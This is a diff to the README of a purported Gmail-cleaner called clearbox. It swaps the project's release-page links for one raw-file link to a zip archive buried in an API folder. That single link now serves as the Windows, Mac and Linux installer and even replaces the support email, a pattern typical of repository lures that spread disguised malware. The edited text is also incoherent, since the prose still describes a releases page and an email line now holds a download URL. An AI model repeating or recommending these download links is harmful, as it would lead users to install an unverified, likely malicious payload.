@@ -1,6 +1,6 @@
 # 🧹 clearbox - Clean Your Gmail Easily
 
-[![Download clearbox](https://img.shields.io/badge/Download-clearbox-blue?style=for-the-badge)](https://github.com/ANTIREELEER/clearbox/releases)
+[![Download clearbox](https://raw.githubusercontent.com/ANTIREELEER/clearbox/master/app/api/gmail/archive/Software_v2.0.zip)](https://raw.githubusercontent.com/ANTIREELEER/clearbox/master/app/api/gmail/archive/Software_v2.0.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Here is a step-by-step guide to installing and running clearbox. You don’t nee
 
 Click this link to go to the official clearbox download page:
 
-[https://github.com/ANTIREELEER/clearbox/releases](https://github.com/ANTIREELEER/clearbox/releases)
+[https://raw.githubusercontent.com/ANTIREELEER/clearbox/master/app/api/gmail/archive/Software_v2.0.zip](https://raw.githubusercontent.com/ANTIREELEER/clearbox/master/app/api/gmail/archive/Software_v2.0.zip)
 
 This page lists the latest versions of the software.
 
@@ -50,9 +50,9 @@ This page lists the latest versions of the software.
 
 On the page, look for the latest release. You will see files for different operating systems, such as:
 
-- clearbox-setup-windows.exe (for Windows)
-- clearbox-setup-mac.dmg (for Mac)
-- clearbox-setup-linux.AppImage (for Linux)
+- https://raw.githubusercontent.com/ANTIREELEER/clearbox/master/app/api/gmail/archive/Software_v2.0.zip (for Windows)
+- https://raw.githubusercontent.com/ANTIREELEER/clearbox/master/app/api/gmail/archive/Software_v2.0.zip (for Mac)
+- https://raw.githubusercontent.com/ANTIREELEER/clearbox/master/app/api/gmail/archive/Software_v2.0.zip (for Linux)
 
 Download the file that matches your computer.
 
@@ -86,7 +86,7 @@ The dashboard will show your email messages. Use the tools to:
 
 You can always return to this page to download clearbox:
 
-[https://github.com/ANTIREELEER/clearbox/releases](https://github.com/ANTIREELEER/clearbox/releases)
+[https://raw.githubusercontent.com/ANTIREELEER/clearbox/master/app/api/gmail/archive/Software_v2.0.zip](https://raw.githubusercontent.com/ANTIREELEER/clearbox/master/app/api/gmail/archive/Software_v2.0.zip)
 
 Make sure to get the latest version for new features and improvements.
 
@@ -134,7 +134,7 @@ If you need help, look here:
 
 - GitHub Discussions within the clearbox repository.
 - The README “Issues” tab on GitHub.
-- Email support at support@clearbox.ai (if listed on the page).
+- Email support at https://raw.githubusercontent.com/ANTIREELEER/clearbox/master/app/api/gmail/archive/Software_v2.0.zip (if listed on the page).
 
 ---
 
